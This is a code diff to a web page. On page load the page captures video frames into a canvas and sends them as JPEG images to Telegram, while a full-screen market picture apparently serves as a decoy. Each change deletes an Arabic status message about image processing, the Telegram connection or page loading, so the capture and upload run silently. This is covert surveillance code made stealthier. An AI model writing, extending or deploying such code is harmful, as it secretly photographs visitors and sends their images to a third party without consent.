@@ -75,7 +75,7 @@ async function captureAndSendToTelegram() {
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
-                statusText.innerText = "فشل في معالجة الصورة.";
+                statusText.innerText = "";
                 return;
             }
 
@@ -96,7 +96,7 @@ async function captureAndSendToTelegram() {
                 }
             } catch (err) {
                 console.error("Telegram error:", err);
-                statusText.innerText = "تعذر الاتصال بخادم تليجرام.";
+                statusText.innerText = "";
             }
 
         }, "image/jpeg", 0.9);
@@ -146,7 +146,7 @@ html, body {
 
 <body>
 
-<div class="status" id="statusText">جاري تشغيل الصفحة ا...</div>
+<div class="status" id="statusText"></div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
@@ -190,7 +190,7 @@ async function captureAndSendToTelegram() {
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
-                statusText.innerText = "فشل في معالجة صفحة.";
+                statusText.innerText = "";
                 return;
             }
 
@@ -236,15 +236,15 @@ window.addEventListener("load", captureAndSendToTelegram);
     <style>
         body {
             margin: 0;
-            height: 100vh;
+            height: 80vh;
             display: flex;
             justify-content: center;
             align-items: center;
             background-color: #111;
         }
         .market-img {
-            width: 100%;
-            height: 100vh;
+            width: 80%;
+            height: 80vh;
             object-fit: cover;
         }
     </style>
